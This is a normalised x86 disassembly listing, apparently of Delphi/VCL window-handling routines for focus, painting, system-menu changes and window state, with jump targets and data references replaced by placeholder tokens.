lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
mov dl 0x1
mov eax edi
call sub_494660
cmp ebx eax
jne r-xdata
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb6
call sub_40587c
test al al
jne r-xdata
sub_49976c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x290 ]
mov eax esi
call sub_4755c0
test al al
je r-xdata
mov edx [ edi + 0x294 ]
mov eax esi
call sub_4755c0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_499690
mov eax [ esi + 0x34 ]
mov [ edi + 0x294 ] eax
sub_4997b4
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
movzx ebx [ ebp + 0x29d ]
test bl bl
je r-xdata
mov edx edi
mov eax ebp
call sub_499690
test bl bl
jne r-xdata
cmp [ ebp + 0x29e ] 0x1
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov edx [ eax ]
call [ edx + 0xe8 ]
test edi edi
je r-xdata
cmp edi [ ebp + 0x290 ]
jne r-xdata
mov eax edi
call sub_47a060
test al al
je r-xdata
mov eax edi
mov si 0xffb3
call sub_40587c
test al al
jne r-xdata
mov eax edi
call sub_479ce0
push eax
call SetFocus
sub_499820
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x5 ] 0x0
inc [ rw-data ]
cmp [ edi + 0x2bc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x60 ] edx
mov eax [ rw-data ]
mov [ eax + 0x64 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x54 ]
mov esi edi
mov edx esi
xor ecx ecx
call sub_4307b0
mov eax [ rw-data ]
mov eax [ eax + 0x54 ]
mov ecx edi
xor edx edx
call sub_430658
mov eax edi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x68 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx esi
xor ecx ecx
call sub_4307b0
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_430658
jmp r-xdata
xor eax eax
mov [ edi + 0x290 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x290 ] eax
jmp r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
or eax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] eax
xor edx edx
push ebp
push sub_499a9d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x74 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x294 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x294 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x294 ] edi
mov eax [ rw-data ]
mov [ eax + 0x74 ] edi
mov eax edi
call sub_479ce0
mov dx 0xb000
call sub_494398
test al al
jne r-xdata
call sub_479ce0
mov ebx eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x74 ] edx
mov dx 0xb001
mov eax ebx
call sub_494398
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_499aa4
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
not edx
and edx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] edx
retn
jmp r-xdata
call sub_4061a4
jmp r-xdata
call sub_4061a4
jmp r-xdata
mov esi [ edi + 0x294 ]
test esi esi
je r-xdata
mov eax [ edi + 0x294 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4755c0
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ edi + 0x294 ]
call sub_479ce0
mov ebx eax
mov eax [ edi + 0x294 ]
mov eax [ eax + 0x34 ]
mov [ edi + 0x294 ] eax
mov dx 0xb01b
mov eax ebx
call sub_494398
test al al
jne r-xdata
jmp r-xdata
mov ebx [ esi + 0x34 ]
cmp ebx [ edi + 0x294 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_472314
mov eax [ edi + 0x2e0 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
call sub_4061a4
jmp r-xdata
mov esi ebx
mov [ edi + 0x294 ] esi
mov eax esi
call sub_479ce0
mov dx 0xb01a
call sub_494398
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
call sub_4061a4
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_472314
mov esi [ esi + 0x34 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xf0 ]
sub_499ac8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x290 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
je r-xdata
cmp [ ebx + 0x2bc ] 0x0
jne r-xdata
mov esi ebx
cmp [ ebx + 0x2bc ] 0x0
jne r-xdata
mov esi eax
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax esi
call sub_472314
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_47a1e8
mov esi eax
test esi esi
jne r-xdata
mov eax esi
call sub_479ce0
push eax
call SetFocus
mov eax esi
call sub_479ce0
mov ebx eax
call GetFocus
cmp ebx eax
jne r-xdata
mov esi ebx
jmp r-xdata
sub_499b40
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x29d ] bl
mov eax [ esi + 0x2e0 ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
movzx ecx bl
mov edx 0xb02b
call sub_472314
pop esi
pop ebx
retn
cmp [ esi + 0x290 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_499bf4
mov eax esi
call sub_499ac8
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_47a1e8
mov edx eax
mov eax esi
call sub_499690
sub_499ba4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x29d ] 0x0
je r-xdata
cmp [ ebx + 0x29e ] 0x2
jne r-xdata
cmp [ ebx + 0x290 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_497e38
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x290 ]
call sub_472314
mov eax ebx
call sub_497e38
mov edx esi
call sub_499ba4
sub_499bf4
push esi
test [ eax + 0x384 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x2b4 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x29e ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x29e ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x2b4 ]
test dl dl
je r-xdata
cmp [ eax + 0x2b4 ] 0x0
je r-xdata
mov edx esi
call sub_4617b8
mov edx esi
call sub_46179c
jmp r-xdata
mov ecx [ eax + 0x2b4 ]
cmp [ ecx + 0x64 ] 0x0
jne r-xdata
mov esi [ eax + 0x2b4 ]
cmp [ eax + 0x29e ] 0x1
jne r-xdata
sub_499c9c
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x34 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_479ce0
push eax
call __imp_SendMessageW
sub_499ce8
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x290 ]
mov eax 0xb000
call sub_499c9c
cmp [ ebx + 0x2ea ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2ec ]
call [ ebx + 0x2e8 ]
sub_499d18
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x290 ]
mov eax 0xb001
call sub_499c9c
cmp [ ebx + 0x302 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x304 ]
call [ ebx + 0x300 ]
sub_499d84
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
call sub_44cf34
xor eax eax
push ebp
push sub_499f70
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
mov edx [ ebp - 0x8 ]
call sub_44dfac
xor eax eax
push ebp
push sub_499f4d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_499f00
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x374 ]
mov eax ebx
call sub_4a25fc
test al al
jne r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2bc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x378 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x378 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_499f07
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call RestoreDC
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
mov eax [ eax + 0x48 ]
mov edx 0xff000002
call sub_44cd1c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
mov eax [ eax + 0x48 ]
mov dl 0x5
call sub_44ce9c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
call sub_44bb2c
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
call sub_44df24
push eax
call SetBkColor
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
push 0x4
call GetStockObject
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
call sub_44df24
push eax
call FillRect
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x18 ]
push eax
mov eax [ ebp - 0x14 ]
sub eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2bc ] 0x0
jne r-xdata
sub_499f07
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2bc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffa5
call sub_40587c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2bc ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_499f54
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
xor edx edx
call sub_44dfac
retn
sub_499f80
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_497e38
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_497e6c
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
movzx edx [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_40587c
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
movzx edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_478d60
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_497eb8
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
movzx edx [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_40587c
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_49a024
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_479ce0
call sub_494028
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_479ce0
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_499d68
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_479ce0
push eax
call EndPaint
mov eax [ r-xdata ]
or eax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] eax
mov edx esi
mov eax ebx
call sub_47789c
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] eax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_49a09c
push ebx
mov ebx eax
mov eax ebx
call sub_47ac10
cmp [ ebx + 0x2bc ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x2bc ]
mov edx [ eax ]
call [ edx + 0x2c ]
sub_49a0c4
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x29e ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x29e ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x1c0 ]
call sub_44cd7c
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x54 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_49a124
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_479ce0
call sub_494028
test eax eax
jne r-xdata
mov [ esi ] 0x27
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_477c90
pop esi
pop ebx
retn
sub_49a16c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x299 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x298 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x29e ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_479ce0
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x299 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x298 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x298 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_49a268
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x2b4 ]
mov eax [ ebp - 0x4 ]
call sub_498258
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_49a16c
pop ecx
sub_49a29c
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
call sub_478d3c
pop esi
retn
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_49a2c0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_472dc8
cmp [ ebx + 0x8b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_479ce0
call sub_494028
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_479ce0
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_479ce0
push eax
call PostMessageW
cmp [ ebx + 0x29d ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x60 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_471638
pop esi
pop ebx
retn
sub_49a34c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_4984b8
mov ebp eax
mov eax [ edi + 0x344 ]
test eax eax
je r-xdata
cmp [ edi + 0x358 ] 0x0
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
test [ edi + 0x1c ] 0x8
jne r-xdata
mov eax [ edi + 0x358 ]
call sub_4984b8
mov edx edi
call sub_430608
test eax eax
jge r-xdata
inc esi
xor ebx ebx
xor eax eax
mov [ edi + 0x35c ] eax
mov eax edi
mov si 0xffa8
call sub_40587c
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ edi + 0x358 ]
call sub_498490
mov edx edi
call sub_430608
inc eax
jle r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ edi + 0x344 ]
call sub_4305a0
mov edx eax
mov eax ebp
call sub_430608
test eax eax
jge r-xdata
cmp [ edi + 0x2b4 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax edi
call sub_479ce0
push eax
call __imp_SendMessageW
mov eax [ rw-data ]
cmp ebx [ eax + 0x170 ]
je r-xdata
mov eax [ edi + 0x358 ]
call sub_4984b8
mov edx edi
call sub_4303e0
jmp r-xdata
mov edx ebx
mov eax [ edi + 0x344 ]
call sub_4305a0
call sub_47a060
test al al
je r-xdata
mov edx ebx
mov eax [ edi + 0x344 ]
call sub_4305a0
mov edx eax
mov eax ebp
call sub_4303e0
mov edx [ esp ]
mov eax edi
call sub_478cb4
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x29e ] 0x1
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4a1f48
mov [ esp + 0x4 ] eax
mov eax [ edi + 0x258 ]
mov [ esp + 0x8 ] eax
cmp [ edi + 0x35c ] 0x0
setne al
mov [ esp + 0xc ] al
mov eax [ rw-data ]
mov eax [ eax + 0x178 ]
push eax
lea eax [ esp + 0x8 ]
push eax
push 0xb048
push ebx
call SendMessageW
push 0x0
mov eax edi
call sub_479ce0
push eax
call SetMenu
xor edx edx
mov eax [ edi + 0x2b4 ]
call sub_4611c4
sub_49a4e0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_477afc
cmp [ ebx + 0x2b4 ] 0x0
je r-xdata
movzx edx [ esi + 0x4 ]
mov eax [ ebx + 0x2b4 ]
call sub_4608ec
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_49a52c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x2b4 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_461438
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_49a564
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_49a5ff
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x2b4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49a606
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x2b4 ]
call sub_46084c
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4a14ac
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_46d7ec
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4a14ac
jmp r-xdata
sub_49a60c
push ebx
push esi
mov esi edx
mov ebx eax
push 0xfffffff0
mov eax ebx
call sub_479ce0
push eax
call GetWindowLongW
and eax 0x40000000
cmp eax 0x40000000
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x29e ] 0x2
jne r-xdata
cmp [ esi + 0x4 ] 0x0
setne dl
mov eax ebx
call sub_499b40
test [ ebx + 0x1c ] 0x10
je r-xdata
sub_49a650
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
test [ ebx + 0x55 ] 0x20
jne r-xdata
cmp [ ebx + 0x2cc ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x68 ]
mov [ ebx + 0x29a ] dl
pop ebx
retn
mov eax [ ebx + 0x2cc ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_49a6ac
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_499ba4
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_46d4a0
test eax eax
je r-xdata
cmp [ eax + 0x29e ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x2b4 ] 0x0
je r-xdata
mov edx [ eax + 0x2b4 ]
cmp [ edx + 0x64 ] 0x0
je r-xdata
sub_49a704
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_478b94
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_49f558
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5d ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5d ] 0x0
je r-xdata
cmp [ ebx + 0x29a ] 0x1
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x68 ]
sub_49a78c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_479ce0
call sub_494028
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_479ce0
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x29b ] 0x2
jmp r-xdata
cmp [ ebx + 0x29b ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x29b ] 0x1
mov [ ebx + 0x29b ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
movzx eax [ ebx + 0x29b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_479ce0
push eax
call ShowWindow
mov [ ebx + 0x29b ] 0x0
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
mov [ eax + 0x34 ] 0x0
pop esi
pop ebx
retn
sub_49a838
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x29e ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_479ce0
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_499b40
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_40587c
sub_49a890
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x290 ]
call sub_47a2f4
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_49a8bc
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_499ba4
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_49a8d8
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_46087c
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_46087c
sub_49a918
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x160 ] 0x1
jne r-xdata
cmp [ esi + 0x160 ] 0x0
jne r-xdata
cmp [ esi + 0x168 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x164 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_49a950
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x160 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x164 ]
call sub_4070a8
mov [ edx ] 0x1
mov eax [ ebx + 0x168 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_49a984
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_49aad6
push [ fs : eax ]
mov [ fs : eax ] esp
